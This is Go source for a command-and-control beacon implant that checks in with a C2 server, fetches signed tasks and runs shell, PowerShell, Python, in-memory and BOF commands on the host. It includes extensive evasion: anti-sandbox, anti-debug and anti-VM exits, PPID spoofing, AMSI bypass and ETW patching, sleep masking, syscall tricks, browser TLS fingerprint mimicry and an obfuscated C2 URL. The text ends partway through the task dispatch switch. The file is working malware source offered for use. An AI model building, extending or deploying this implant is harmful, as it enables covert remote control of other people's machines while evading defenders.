	package main

	import (
		"bytes"
		"context"
		"crypto/ecdsa"
		crand "crypto/rand"
		"crypto/sha256"
		"crypto/tls"
		"crypto/x509"
		"encoding/base64"
		"encoding/hex"
		"encoding/json"
		"encoding/pem"
		"errors"
		"fmt"
		"io"
		"math/rand"
		"net/http"
		"os"
		"os/exec"
		"os/user"
		"runtime"
		"strconv"
		"strings"
		"sync"
		"time"

		// Local package for sleep mask and platform-specific evasion.
		// Rename the import path if your module is not `agent`.
		"tornadorevc2/agent/evasion"
	)

	// ---------------------------------------------------------------------------
	// Build-time parameters.
	//
	// Go's -X linker flag only sets variables declared as `string`.
	// Everything that must be tunable at build time is therefore
	// declared as a string below (some suffixed `Raw`), and parsed
	// into the actual Go types in init(). Call sites use the parsed
	// values — they are never strings.
	//
	// To set a value at build time:
	//   go build -ldflags "-X main.KillDaysRaw=40 -X main.AntiVmRaw=true ..."

	var (
		// Straight string values — used as-is.
		DefaultURL      = "https://127.0.0.1:9443"
		DefaultProfile  = "default"
		ServerPubKeyPem = ""
		ClientCertPem   = ""
		ClientKeyPem    = ""
		RootCAPem       = ""
		ProfileJSON     = ""
		AgentPrivKeyPem = ""

		// ObfKeyHex is the hex-encoded XOR key the builder used to
		// obfuscate DefaultURL and ProfileJSON before embedding them
		// via -X. See deobf() below.
		ObfKeyHex = ""

		// TLS ClientHello fingerprint. Controls which uTLS
		// ClientHello the agent presents on the wire.
		//
		//   "go"      — standard library crypto/tls (pre-utls default)
		//   "chrome"  — Chrome 120 ClientHello
		//   "firefox" — Firefox 120 ClientHello
		//   "safari"  — Safari 16.0 ClientHello
		//
		// A defender with a JA3/JA4 database can distinguish Go's
		// client from a browser in a single capture. Setting this to
		// a browser name closes that gap. See tls_fingerprint.go for
		// the ALPN caveat that applies when a browser profile is used.
		TLSProfile = "go"

		// Working-hours window as strings for the -X linker flag.
		// Parsed into the int vars below in init().
		WorkHoursStartRaw = "08:00"
		WorkHoursEndRaw   = "19:00"

		// Sleep-mask algorithm. Recognised values:
		//   "none"    — no masking
		//   "rc4"     — RC4 keystream over .text
		//   "aes-ctr" — AES-CTR keystream over .text
		//   "ekko"    — timer-queue-based, ROP-chain wake
		// The builder emits this as `-X main.SleepMaskType=…`.
		SleepMaskType = "none"

		// Syscall method for Windows syscalls. Recognised values:
		//   "direct"   — call the ntdll stub address directly
		//   "indirect" — jump to the syscall instruction inside ntdll
		// The builder emits this as `-X main.SyscallMethod=…`.
		SyscallMethod = "direct"

		// Verbose controls whether the agent writes diagnostic lines
		// to stderr. Default is silent: a payload that writes to
		// stderr on every failed check-in leaves a forensic artefact
		// on the target (journald, Windows Event Log when wrapped,
		// process accounting on some UNIX). Enable at build time with
		// `-X main.VerboseRaw=true` for debugging only; never enable
		// for a live engagement.
		VerboseRaw = "false"

		// Values that look like numbers or booleans on the command
		// line but arrive as strings. Parsed in init().
		DefaultSleepSecondsRaw = "60"
		DefaultJitterRaw       = "0.3"
		KillDaysRaw            = "30"
		AntiSandboxEnabledRaw  = "false"
		SleepMaskEnabledRaw    = "false"
		AmsiBypassRaw          = "false"
		EtwPatchRaw            = "false"
		StringObfuscationRaw   = "false"
		PpidSpoofRaw           = "false"
		AntiDebugRaw           = "false"
		AntiVmRaw              = "false"
	)

	// Parsed values — the types the rest of the code uses. These
	// names are unchanged from before, so no call site needs
	// modification.
	var (
		DefaultSleepSeconds int     = 60
		DefaultJitter       float64 = 0.3
		KillDays            int     = 30
		AntiSandboxEnabled  bool    = false
		SleepMaskEnabled    bool    = false
		AmsiBypass          bool    = false
		EtwPatch            bool    = false
		StringObfuscation   bool    = false
		PpidSpoof           bool    = false
		AntiDebug           bool    = false
		AntiVm              bool    = false
		Verbose             bool    = false

		// Working-hours window as minutes since midnight. Populated
		// from the WorkHoursStartRaw / WorkHoursEndRaw build flags
		// at init time, then overridable at runtime by the operator
		// via the beacon console. The server pushes the current
		// values on every /tasks response; the agent applies them
		// immediately.
		//
		// Semantics:
		//   start == end       → disabled (beacon runs 24/7)
		//   start <  end       → normal window, e.g. 08:00–19:00
		//   start >  end       → wrapped window, e.g. 22:00–06:00
		WorkHoursStart int = 480   // 08:00
		WorkHoursEnd   int = 1140  // 19:00

	)

	// deobf reverses the builder's XOR+base64 obfuscation of a -X
	// value. When ObfKeyHex is empty (legacy build), the input is
	// returned unchanged.
	func deobf(encoded string, keyHex string) string {
		if encoded == "" || keyHex == "" {
			return encoded
		}
		key, err := hex.DecodeString(keyHex)
		if err != nil || len(key) == 0 {
			return encoded
		}
		raw, err := base64.StdEncoding.DecodeString(encoded)
		if err != nil {
			return encoded
		}
		out := make([]byte, len(raw))
		for i := range raw {
			out[i] = raw[i] ^ key[i%len(key)]
		}
		return string(out)
	}

	// diag writes a diagnostic line to stderr when the build enabled
	// verbose mode. Silent by default so the agent leaves no forensic
	// artefact on the target. Use `-X main.VerboseRaw=true` at build
	// time to turn it back on for debugging.
	func diag(format string, args ...interface{}) {
		if !Verbose {
			return
		}
		fmt.Fprintf(os.Stderr, format, args...)
	}

	func init() {
		if v, err := strconv.Atoi(DefaultSleepSecondsRaw); err == nil && v > 0 {
			DefaultSleepSeconds = v
		}
		if v, err := strconv.ParseFloat(DefaultJitterRaw, 64); err == nil && v >= 0 {
			DefaultJitter = v
		}
		if v, err := strconv.Atoi(KillDaysRaw); err == nil && v >= 0 {
			KillDays = v
		}
		AntiSandboxEnabled = (AntiSandboxEnabledRaw == "true")
		SleepMaskEnabled   = (SleepMaskEnabledRaw == "true")
		AmsiBypass         = (AmsiBypassRaw == "true")
		EtwPatch           = (EtwPatchRaw == "true")
		StringObfuscation  = (StringObfuscationRaw == "true")
		PpidSpoof          = (PpidSpoofRaw == "true")
		AntiDebug          = (AntiDebugRaw == "true")
		AntiVm             = (AntiVmRaw == "true")
		Verbose            = (VerboseRaw == "true")

		// Working-hours window. The build flags are strings for the
		// linker; parse them once here. A malformed value silently
		// falls back to the compile-time default above (08:00–19:00),
		// so a bad flag does not lock the beacon into an empty window.
		if v, ok := parseClock(WorkHoursStartRaw); ok {
			WorkHoursStart = v
		}
		if v, ok := parseClock(WorkHoursEndRaw); ok {
			WorkHoursEnd = v
		}

		// Publish the syscall method to the evasion package so its
		// Windows syscall primitives know whether to jump to the
		// ntdll stub directly ("direct") or to the syscall
		// instruction inside ntdll ("indirect"). No-op on Linux
		// because the Windows-specific code is behind build tags.
		evasion.SetSyscallMethod(SyscallMethod)

		// Reverse the builder's XOR obfuscation of the two values that
		// would otherwise appear in `strings` output: the C2 URL and
		// the malleable profile JSON. Runs last so every other init
		// step sees the already-decoded values.
		if ObfKeyHex != "" {
			DefaultURL = deobf(DefaultURL, ObfKeyHex)
			ProfileJSON = deobf(ProfileJSON, ObfKeyHex)
		}
	}

	// ---------------------------------------------------------------------------
	// Wire types (mirror of beacon/protocol.py)

	type Identity struct {
		Hostname  string `json:"hostname"`
		Username  string `json:"username"`
		MachineID string `json:"machine_id"`
		OS        string `json:"os"`
		Arch      string `json:"arch"`
		Proto     int    `json:"proto"`
		// KillDays is the build-time self-destruct window. The server
		// echoes it back as X-Beacon-Kill so the agent's own deadline
		// and the server's record agree. Without this field the server
		// falls back to its own default and silently overrides the
		// operator's --kill-days flag.
		KillDays  int    `json:"kill_days"`
		// WorkStart and WorkEnd are the build-time working-hours
		// window, in minutes since midnight (0-1439). The server
		// stores these at session creation and echoes them back as
		// X-Beacon-WorkStart / X-Beacon-WorkEnd. Without them the
		// server pushes its hardcoded default (08:00-19:00) on the
		// first poll and silently overrides the operator's build-time
		// choice — including `--work-off`, which becomes 08:00-19:00
		// the moment the agent fetches its first task batch.
		WorkStart int    `json:"work_start"`
		WorkEnd   int    `json:"work_end"`
	}

	type CheckinRequest struct {
		Identity    Identity `json:"identity"`
		AgentPubKey string   `json:"agent_pubkey,omitempty"`
	}

	type CheckinResponse struct {
		ID           int     `json:"id"`
		Sleep        int     `json:"sleep"`
		Jitter       float64 `json:"jitter"`
		KillDeadline float64 `json:"kill_deadline"`
		Proto        int     `json:"proto"`
		// Cookie is an opaque HMAC-signed token that proves this
		// session to the server on every subsequent request. It
		// replaces the enumerable X-Beacon-Id header.
		Cookie string `json:"cookie,omitempty"`
	}


	type Task struct {
		ID        string   `json:"id"`
		Verb      string   `json:"verb"`
		Args      []string `json:"args"`
		Timeout   int      `json:"timeout"`
		Signature string   `json:"signature,omitempty"`
	}

	// unsigned returns the exact bytes the signature covers.
	func (t Task) unsigned() ([]byte, error) {
		body := map[string]interface{}{
			"id":      t.ID,
			"verb":    t.Verb,
			"args":    t.Args,
			"timeout": t.Timeout,
		}
		return marshalCanonical(body)
	}

	type Result struct {
		ID        string `json:"id"`
		Output    string `json:"output"`
		Error     string `json:"error,omitempty"`
		ExitCode  int    `json:"exit_code"`
		Signature string `json:"signature,omitempty"`
	}

	// signable returns the canonical JSON bytes the signature covers.
	// Same field set the server uses on its side to verify.
	func (r Result) signable() ([]byte, error) {
		body := map[string]interface{}{
			"id":        r.ID,
			"output":    r.Output,
			"error":     r.Error,
			"exit_code": r.ExitCode,
		}
		return marshalCanonical(body)
	}

	// ---------------------------------------------------------------------------
	// Profile

	type Profile struct {
		UserAgent       string            `json:"user_agent"`
		LinuxUserAgent  string            `json:"linux_user_agent"`
		BeaconPath      string            `json:"beacon_path"`
		TasksPath       string            `json:"tasks_path"`
		ResultsPath     string            `json:"results_path"`
		ExtraHeaders    map[string]string `json:"extra_headers"`
		RequestHeaders  map[string]string `json:"request_headers"`
	}

	// Resolved returns the profile with platform-specific defaults filled in.
	func (p Profile) Resolved() Profile {
		if p.UserAgent == "" {
			p.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) " +
				"AppleWebKit/537.36 (KHTML, like Gecko) " +
				"Chrome/120.0.0.0 Safari/537.36"
		}
		if runtime.GOOS == "linux" && p.LinuxUserAgent != "" {
			p.UserAgent = p.LinuxUserAgent
		}
		if p.BeaconPath == "" {
			p.BeaconPath = "/beacon"
		}
		if p.TasksPath == "" {
			p.TasksPath = "/tasks"
		}
		if p.ResultsPath == "" {
			p.ResultsPath = "/results"
		}
		if p.ExtraHeaders == nil {
			p.ExtraHeaders = map[string]string{}
		}
		if p.RequestHeaders == nil {
			p.RequestHeaders = map[string]string{}
		}
		return p
	}

	func defaultProfile() Profile {
		ua := "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
		if runtime.GOOS == "linux" {
			ua = "Mozilla/5.0 (X11; Linux x86_64)"
		}
		return Profile{
			UserAgent:    ua,
			BeaconPath:   "/beacon",
			TasksPath:    "/tasks",
			ResultsPath:  "/results",
			ExtraHeaders: map[string]string{},
		}
	}

	// ---------------------------------------------------------------------------
	// Agent

	type Agent struct {
		url      string
		client   *http.Client
		session  CheckinResponse
		identity Identity
		profile  Profile
		deadline time.Time

		serverPub *ecdsa.PublicKey    // verifies incoming tasks
		agentPriv *ecdsa.PrivateKey   // signs outgoing results
		signMu    sync.Mutex
		rngMu     sync.Mutex
		rng       *rand.Rand
	}

	func main() {
		// Anti-sandbox: run every check before any network activity.
		// First pass runs immediately; if it trips, sleep for a long random
		// interval before re-checking so the sandbox does not see a
		// start-then-immediate-exit pattern (which some sandboxes flag).
		if AntiSandboxEnabled {
			if evasion.SandboxDetected() {
				sleep := time.Duration(4+rand.Intn(4)) * time.Hour
				time.Sleep(sleep)
				if evasion.SandboxDetected() {
					os.Exit(0)
				}
			}
		}

		// Anti-debug: if a debugger is attached, exit silently. Same
		// rationale as the sandbox check — a live debugger sees everything
		// that happens after this point, so there is no value in running.
		if AntiDebug {
			if evasion.DebuggerDetected() {
				os.Exit(0)
			}
		}

		// Anti-VM: exit if the environment looks virtualised. Aggressive —
		// a legitimate VM target is indistinguishable from a sandbox VM by
		// these heuristics. Only enable on profiles where the target is
		// known to be bare-metal.
		if AntiVm {
			if evasion.InVM() {
				os.Exit(0)
			}
		}

		// Windows-only features. PPID spoof must run before any network
		// activity, and the caller must exit after a successful respawn so
		// only one instance survives.
		if runtime.GOOS == "windows" {
			if PpidSpoof {
				spawned, err := evasion.PPIDSpoof()
				if err == nil && spawned {
					os.Exit(0)
				}
				// If the respawn failed, continue in the original process.
			}
			if AmsiBypass || EtwPatch {
				evasion.ApplyWindowsEvasion(AmsiBypass, EtwPatch)
			}
		}

		agent, err := newAgent()
		if err != nil {
			os.Exit(1)
		}
		agent.run()
	}

	func newAgent() (*Agent, error) {
		a := &Agent{
			url: strings.TrimRight(DefaultURL, "/"),
			rng: rand.New(rand.NewSource(time.Now().UnixNano())),
		}

		// Load embedded profile if present. Post-obfuscation builds ship
		// ProfileJSON as raw JSON (init() already un-XORed it). Legacy
		// builds shipped it as base64. Try JSON first, fall back to
		// base64 so both shapes work.
		a.profile = defaultProfile()
		if ProfileJSON != "" {
			if err := json.Unmarshal([]byte(ProfileJSON), &a.profile); err != nil {
				if raw, derr := base64.StdEncoding.DecodeString(ProfileJSON); derr == nil {
					_ = json.Unmarshal(raw, &a.profile)
				}
			}
		}
		// Resolve platform-specific defaults.
		a.profile = a.profile.Resolved()

		// Parse embedded server public key for task verification.
		if ServerPubKeyPem != "" {
			raw, err := base64.StdEncoding.DecodeString(ServerPubKeyPem)
			if err == nil {
				if pub, err := parseECDSAPublicKey(raw); err == nil {
					a.serverPub = pub
				}
			}
		}

		// Parse embedded agent private key for result signing.
		if AgentPrivKeyPem != "" {
			raw, err := base64.StdEncoding.DecodeString(AgentPrivKeyPem)
			if err == nil {
				if priv, err := parseECDSAPrivateKey(raw); err == nil {
					a.agentPriv = priv
				}
			}
		}

		// Build the HTTP client with optional mTLS + custom CA.
		tlsCfg, err := a.buildTLSConfig()
		if err != nil {
			return nil, err
		}
		transport := &http.Transport{
			TLSClientConfig:       tlsCfg,
			ForceAttemptHTTP2:     true,
			TLSHandshakeTimeout:   15 * time.Second,
			ResponseHeaderTimeout: 30 * time.Second,
			IdleConnTimeout:       90 * time.Second,
		}

		// When a browser TLS profile is selected, replace the
		// transport's built-in TLS dialer with a uTLS dialer that
		// produces a byte-exact browser ClientHello. ForceAttemptHTTP2
		// is forced off on this path because our ALPN advertises
		// http/1.1 only — see tls_fingerprint.go for why.
		if prof := strings.ToLower(strings.TrimSpace(TLSProfile)); prof != "" && prof != "go" {
			transport.DialTLSContext = utlsDialTLS(tlsCfg, prof)
			transport.ForceAttemptHTTP2 = false
		}

		a.client = &http.Client{
			// 60s is long enough for a slow link but short enough that
			// a hung server does not freeze the beacon indefinitely.
			// The transport itself also has per-phase timeouts below.
			Timeout:   60 * time.Second,
			Transport: transport,
		}


		// Kill date.
		if KillDays > 0 {
			a.deadline = time.Now().Add(time.Duration(KillDays) * 24 * time.Hour)
		}

		a.identity = gatherIdentity()
		return a, nil
	}

	func (a *Agent) buildTLSConfig() (*tls.Config, error) {
		cfg := &tls.Config{
			MinVersion: tls.VersionTLS12,
			NextProtos: []string{"h2", "http/1.1"},
			// Session resumption. The server issues four tickets per
			// session; keeping a client-side cache lets the agent
			// resume across reconnects rather than doing a full
			// handshake every time. Matches browser behaviour and
			// drops the telemetry cost of a repeated ClientHello.
			ClientSessionCache: tls.NewLRUClientSessionCache(16),
		}

		// Trust: if a root CA is embedded, verify the chain against
		// it. Hostname verification is deliberately skipped (C2
		// servers are commonly reached by IP or a redirector domain
		// that does not match the certificate CN), but chain
		// verification against the pinned CA is the actual security
		// guarantee and must run.
		//
		// InsecureSkipVerify = true alone disables everything —
		// including the chain check — because Go's crypto/tls only
		// consults RootCAs when InsecureSkipVerify is false. The
		// correct way to skip only the hostname check is a custom
		// VerifyConnection callback.
		if RootCAPem != "" {
			raw, err := base64.StdEncoding.DecodeString(RootCAPem)
			if err == nil {
				pool := x509.NewCertPool()
				if pool.AppendCertsFromPEM(raw) {
					cfg.RootCAs = pool
					cfg.InsecureSkipVerify = true
					cfg.VerifyConnection = func(cs tls.ConnectionState) error {
						opts := x509.VerifyOptions{
							Roots:         pool,
							Intermediates: x509.NewCertPool(),
							// DNSName intentionally omitted:
							// hostname verification is what we
							// are skipping.
						}
						for _, cert := range cs.PeerCertificates[1:] {
							opts.Intermediates.AddCert(cert)
						}
						_, err := cs.PeerCertificates[0].Verify(opts)
						return err
					}
				}
			}
		} else {
			// No pinned CA: accept any server certificate.
			cfg.InsecureSkipVerify = true
		}

		// mTLS: client certificate.
		if ClientCertPem != "" && ClientKeyPem != "" {
			certRaw, err1 := base64.StdEncoding.DecodeString(ClientCertPem)
			keyRaw, err2 := base64.StdEncoding.DecodeString(ClientKeyPem)
			if err1 == nil && err2 == nil {
				cert, err := tls.X509KeyPair(certRaw, keyRaw)
				if err != nil {
					return nil, err
				}
				cfg.Certificates = []tls.Certificate{cert}
			}
		}

		return cfg, nil
	}

	func (a *Agent) run() {
		// First check-in is delayed 2–17 seconds, matching the
		// latency a user-initiated app exhibits between launch and
		// its first outbound network call. A beacon that fires
		// immediately is more anomalous than one that waits.
		initialDelay := time.Duration(2+a.rngIntn(16)) * time.Second
		time.Sleep(initialDelay)

		// Initial check-in with backoff. Every failure prints to stderr
		// so an operator running the agent on the target sees exactly why
		// the check-in is not landing — unreachable URL, TLS error,
		// 4xx, etc. Without this the agent retries silently forever.
		backoff := time.Second * 5
		for {
			err := a.checkin()
			if err == nil {
				break
			}
			diag("[beacon] check-in to %s%s failed: %v (retry in %v)\n",
				a.url, a.profile.BeaconPath, err, backoff)
			time.Sleep(backoff)
			if backoff < time.Minute*5 {
				backoff *= 2
			}
		}

		// One line at startup so the operator knows which mode the
		// agent is in before any polling happens. Silent unless the
		// build enabled Verbose.
		diag("[beacon] work hours: %s (local %02d:%02d)\n",
			formatWorkHours(), time.Now().Hour(), time.Now().Minute())

		for {
			if !a.deadline.IsZero() && time.Now().After(a.deadline) {
				return
			}

			// Work-hours gate. Outside the window the beacon does not
			// poll and does not execute tasks. It wakes once a minute
			// to check whether the window has opened, then returns to
			// silent waiting. Tasks queued during off-hours stay in
			// the server's queue until the window opens.
			//
			// This is the behaviour the README describes: the beacon's
			// network footprint matches the target population's
			// activity window. It replaces the previous design, where
			// `sleep()` merely slowed the poll interval — which meant
			// the beacon still checked in and still executed tasks
			// during what were supposed to be silent hours.
			//
			// Trade-off: a runtime `workhours` change from the console
			// cannot reach the agent during off-hours, because the
			// change travels in the /tasks response and the agent is
			// not polling. To expand a window outside its current
			// bounds, either rebuild the agent or wait for the window
			// to open.
			if !insideWorkHours(time.Now()) {
				time.Sleep(60 * time.Second)
				continue
			}

			a.pollAndRun()
			a.sleep()
		}
	}

	// ---------------------------------------------------------------------------
	// Check-in

	func (a *Agent) checkin() error {
		// First check-in is silent; subsequent ones (which happen
		// after a session loss) emit a diagnostic on stderr so an
		// operator tailing the agent process sees the recovery.
		if a.session.ID != 0 {
			diag("[beacon] re-checking in (previous id %d)\n",
				a.session.ID)
		}

		// Include the agent's public key so the server can pin it and
		// verify every subsequent result signature.
		payload := CheckinRequest{Identity: a.identity}
		if a.agentPriv != nil {
			pubDER, err := x509.MarshalPKIXPublicKey(&a.agentPriv.PublicKey)
			if err == nil {
				pubPEM := pem.EncodeToMemory(&pem.Block{
					Type:  "PUBLIC KEY",
					Bytes: pubDER,
				})
				payload.AgentPubKey = string(pubPEM)
			}
		}

		body, _ := json.Marshal(payload)
		req, _ := http.NewRequest("POST", a.url+a.profile.BeaconPath,
			bytes.NewReader(body))
		a.applyHeaders(req)

		resp, err := a.client.Do(req)
		if err != nil {
			return err
		}
		defer resp.Body.Close()
		// 403 means the server refused this fingerprint outright —
		// almost always a public-key mismatch against a pinned
		// session. Retrying will never succeed, so terminate.
		if resp.StatusCode == 403 {
			os.Exit(1)
		}
		if resp.StatusCode != 200 {
			return fmt.Errorf("checkin status %d", resp.StatusCode)
		}
		return json.NewDecoder(resp.Body).Decode(&a.session)
	}

	// ---------------------------------------------------------------------------
	// Task loop

	func (a *Agent) pollAndRun() {
		tasks, err := a.fetchTasks()
		if err != nil {
			// Any error that means "the server can't serve us" should
			// trigger a re-check-in. This covers:
			//   - 400/404 (session forgotten or listener restarted)
			//   - TLS / connection errors (server came back on a new
			//     listener or after a NAT re-map)
			//   - HTTP 5xx (server is up but unhealthy)
			//
			// A fresh check-in is cheap and always succeeds if the
			// listener is reachable, so the beacon recovers on its
			// next wake-up rather than polling a dead ID forever.
			msg := err.Error()
			should_recheck :=
				strings.Contains(msg, "status 400") ||
				strings.Contains(msg, "status 401") ||
				strings.Contains(msg, "status 403") ||
				strings.Contains(msg, "status 404") ||
				strings.Contains(msg, "status 500") ||
				strings.Contains(msg, "status 502") ||
				strings.Contains(msg, "status 503") ||
				strings.Contains(msg, "no session cookie") ||
				strings.Contains(msg, "connection refused") ||
				strings.Contains(msg, "no such host") ||
				strings.Contains(msg, "certificate") ||
				strings.Contains(msg, "invalid character") ||
				strings.Contains(msg, "i/o timeout")
			if should_recheck {
				jitter := time.Duration(a.rngIntn(3000)) * time.Millisecond
				time.Sleep(jitter)
				if err := a.checkin(); err != nil {
					diag("[beacon] re-check-in failed: %v\n", err)
				}
			}
			return
		}
		for _, t := range tasks {
			// Skip padding entries. These are single-object strings
			// the server appends to bucket the response size; they
			// carry no ID and no verb, and would fail signature
			// verification anyway.
			if t.ID == "" || t.Verb == "" {
				continue
			}
			if !a.verifyTask(t) {
				// Silent by default (verbose off). A drop here almost
				// always means the agent was built against a different
				// handler run whose signer public key differs from the
				// current listener's — rebuild the agent against the
				// running handler to fix.
				diag("[beacon] dropping task %s verb=%s: signature "+
					"verification failed\n", t.ID, t.Verb)
				continue
			}
			result := a.execute(t)
			_ = a.postResult(result)
		}

	}

	// rngIntn returns a non-negative pseudo-random int in [0, n).
	// Uses the agent's mutex-protected RNG to stay deterministic
	// across concurrent call sites.
	func (a *Agent) rngIntn(n int) int {
		a.rngMu.Lock()
		defer a.rngMu.Unlock()
		return a.rng.Intn(n)
	}

	func (a *Agent) fetchTasks() ([]Task, error) {
		req, _ := http.NewRequest("GET", a.url+a.profile.TasksPath, nil)
		// Cookie is the only accepted credential. A check-in that did
		// not return one means the listener is misconfigured or the
		// agent is speaking a stale protocol — treat it as a session
		// loss so the next wake-up re-checks in.
		if a.session.Cookie == "" {
			return nil, fmt.Errorf("tasks: no session cookie")
		}
		req.Header.Set("Cookie", "sid="+a.session.Cookie)
		a.applyHeaders(req)


		resp, err := a.client.Do(req)
		if err != nil {
			return nil, err
		}
		defer resp.Body.Close()
		if resp.StatusCode != 200 {
			return nil, fmt.Errorf("tasks status %d", resp.StatusCode)
		}

		// Scheduling parameters pushed by the server. Absent on older
		// servers — fall back to whatever is already in a.session.
		if v := resp.Header.Get("X-Beacon-Sleep"); v != "" {
			if n, err := strconv.Atoi(v); err == nil && n >= 0 {
				a.session.Sleep = n
			}
		}
		if v := resp.Header.Get("X-Beacon-Jitter"); v != "" {
			if f, err := strconv.ParseFloat(v, 64); err == nil {
				a.session.Jitter = f
			}
		}
		if v := resp.Header.Get("X-Beacon-Kill"); v != "" {
			if n, err := strconv.ParseInt(v, 10, 64); err == nil && n > 0 {
				a.deadline = time.Unix(n, 0)
			}
		}
		// Working-hours window. Pushed as minutes since midnight.
		// Applied without condition: a value of 0-0 disables the
		// gate, and a normal pair narrows it. Absent headers leave
		// the current values in place, which is what an older server
		// produces.
		if v := resp.Header.Get("X-Beacon-WorkStart"); v != "" {
			if n, err := strconv.Atoi(v); err == nil && n >= 0 && n < 1440 {
				WorkHoursStart = n
			}
		}
		if v := resp.Header.Get("X-Beacon-WorkEnd"); v != "" {
			if n, err := strconv.Atoi(v); err == nil && n >= 0 && n < 1440 {
				WorkHoursEnd = n
			}
		}

		var tasks []Task
		if err := json.NewDecoder(resp.Body).Decode(&tasks); err != nil {
			return nil, err
		}
		return tasks, nil
	}

	func (a *Agent) postResult(r Result) error {
		// Sign the result with the agent's private key. The server verifies
		// against the public key the agent presented at check-in. If the
		// agent was built without a private key, the signature is empty
		// and the server accepts the result unsigned.
		if a.agentPriv != nil {
			payload, err := r.signable()
			if err == nil {
				sig, serr := signPayload(a.agentPriv, payload)
				if serr == nil {
					r.Signature = base64.StdEncoding.EncodeToString(sig)
				}
			}
		}

		body, _ := json.Marshal(r)
		req, _ := http.NewRequest("POST", a.url+a.profile.ResultsPath,
			bytes.NewReader(body))
		// Cookie is the only accepted credential. Without one the
		// listener returns 401 and the result is silently dropped
		// (the caller does not surface postResult's error). Return
		// early so the caller sees a diagnostic instead.
		if a.session.Cookie == "" {
			return fmt.Errorf("results: no session cookie")
		}
		req.Header.Set("Cookie", "sid="+a.session.Cookie)
		req.Header.Set("Content-Type", "application/json")
		a.applyHeaders(req)


		resp, err := a.client.Do(req)
		if err != nil {
			return err
		}
		defer resp.Body.Close()
		return nil
	}

	func (a *Agent) applyHeaders(req *http.Request) {
		// Order matters: ExtraHeaders can override defaults, but the
		// User-Agent is always set last so a profile cannot accidentally
		// leave the default Go UA in place.
		req.Header.Set("Content-Type", "application/json")
		for k, v := range a.profile.RequestHeaders {
			req.Header.Set(k, v)
		}
		for k, v := range a.profile.ExtraHeaders {
			req.Header.Set(k, v)
		}
		req.Header.Set("User-Agent", a.profile.UserAgent)
	}

	// ---------------------------------------------------------------------------
	// ECDSA verification

	func (a *Agent) verifyTask(t Task) bool {
		// If the agent was built without a public key, verification is
		// disabled and every task is accepted. Operators who want the
		// protection simply rebuild with the key.
		if a.serverPub == nil {
			return true
		}
		if t.Signature == "" {
			return false
		}

		sig, err := base64.StdEncoding.DecodeString(t.Signature)
		if err != nil {
			return false
		}

		body, err := t.unsigned()
		if err != nil {
			return false
		}

		a.signMu.Lock()
		defer a.signMu.Unlock()

		hash := sha256.Sum256(body)
		return ecdsa.VerifyASN1(a.serverPub, hash[:], sig)
	}

	func parseECDSAPublicKey(pemBytes []byte) (*ecdsa.PublicKey, error) {
		block, _ := pem.Decode(pemBytes)
		if block == nil {
			return nil, errors.New("no PEM block")
		}
		pub, err := x509.ParsePKIXPublicKey(block.Bytes)
		if err != nil {
			return nil, err
		}
		ecdsaPub, ok := pub.(*ecdsa.PublicKey)
		if !ok {
			return nil, errors.New("not an ECDSA key")
		}
		return ecdsaPub, nil
	}

	// parseECDSAPrivateKey loads an ECDSA P-256 private key from PEM.
	// Used for result signing.
	func parseECDSAPrivateKey(pemBytes []byte) (*ecdsa.PrivateKey, error) {
		block, _ := pem.Decode(pemBytes)
		if block == nil {
			return nil, errors.New("no PEM block")
		}
		priv, err := x509.ParsePKCS8PrivateKey(block.Bytes)
		if err != nil {
			return nil, err
		}
		ecdsaPriv, ok := priv.(*ecdsa.PrivateKey)
		if !ok {
			return nil, errors.New("not an ECDSA private key")
		}
		return ecdsaPriv, nil
	}

	// signPayload signs arbitrary bytes with ECDSA SHA-256. Uses
	// crypto/rand (aliased as crand) — math/rand is not cryptographically
	// secure and must not be used for signature nonces.
	func signPayload(priv *ecdsa.PrivateKey, payload []byte) ([]byte, error) {
		hash := sha256.Sum256(payload)
		return ecdsa.SignASN1(crand.Reader, priv, hash[:])
	}

	// marshalCanonical produces the same bytes Python's
	// json.dumps(obj, sort_keys=True, separators=(',', ':')) produces.
	// Go's encoding/json escapes < > & as \u003c \u003e \u0026 by
	// default; Python does not. Both sides sign over these bytes, so the
	// escaping must match or ECDSA verification fails silently on any
	// value containing those characters.
	//
	// json.Encoder appends a trailing newline; Python's dumps does not,
	// so trim it.
	func marshalCanonical(v interface{}) ([]byte, error) {
		var buf bytes.Buffer
		enc := json.NewEncoder(&buf)
		enc.SetEscapeHTML(false)
		if err := enc.Encode(v); err != nil {
			return nil, err
		}
		out := bytes.TrimRight(buf.Bytes(), "\n")
		// Go's encoding/json unconditionally escapes U+2028 and U+2029
		// as \u2028 / \u2029, regardless of SetEscapeHTML. Python's
		// json.dumps does not. Since both sides sign the canonical bytes
		// byte-for-byte, the two encodings must agree — collapse the Go
		// escape sequences back to their raw UTF-8 forms.
		out = bytes.ReplaceAll(out, []byte(`\u2028`), []byte("\u2028"))
		out = bytes.ReplaceAll(out, []byte(`\u2029`), []byte("\u2029"))
		return out, nil
	}

	// ---------------------------------------------------------------------------
	// Execution

	func (a *Agent) execute(t Task) Result {
		ctx, cancel := context.WithTimeout(context.Background(),
			time.Duration(t.Timeout)*time.Second)
		defer cancel()

		// Extra native verbs live in native_extra.go + platform
		// siblings. Each is fully in-process — no subprocess, no
		// argv, no process-creation telemetry. Keep the dispatch
		// table centralized so this switch stays readable.
		if isNativeExtraVerb(t.Verb) {
			return a.nativeExtraVerb(ctx, t)
		}

		switch t.Verb {
		case "exec":
			return a.execVerb(ctx, t)
		case "sh":
			return a.shVerb(ctx, t)
		case "pyexec":
			return a.pyexecVerb(ctx, t)
		case "psexec":
			return a.psexecVerb(ctx, t)
		case "shexec":
			return a.shexecVerb(ctx, t)
		case "truncate":
			return a.truncateVerb(t)
		case "writechunk":
			return a.writechunkVerb(t)
		case "readchunk":
			return a.readChunkVerb(t)
		case "filesize":
			return a.fileSizeVerb(t)
		case "sha256file":
			return a.sha256FileVerb(t)
		case "execmem":
			return a.execmemVerb(ctx, t)
		case "bof":
			return a.bofVerb(ctx, t)
		case "cat":
			return a.catVerb(t)
		case "ls":
			return a.lsVerb(t)
		case "pwd":
			return a.simpleVerb(t, []byte(mustGetwd()))
		case "whoami":
			return a.simpleVerb(t, []byte(a.identity.Username))
		case "hostname":
			return a.simpleVerb(t, []byte(a.identity.Hostname))
		case "uname":
			return a.simpleVerb(t,
				[]byte(fmt.Sprintf("%s %s", runtime.GOOS, runtime.GOARCH)))
		case "env":
			return a.simpleVerb(t, []byte(strings.Join(os.Environ(), "\n")))
		case "ps":
			return a.psVerb(t)
		case "id":
			return a.idVerb(t)
		case "readfile":
			return a.catVerb(t)   // alias — DESIGN.md references both names
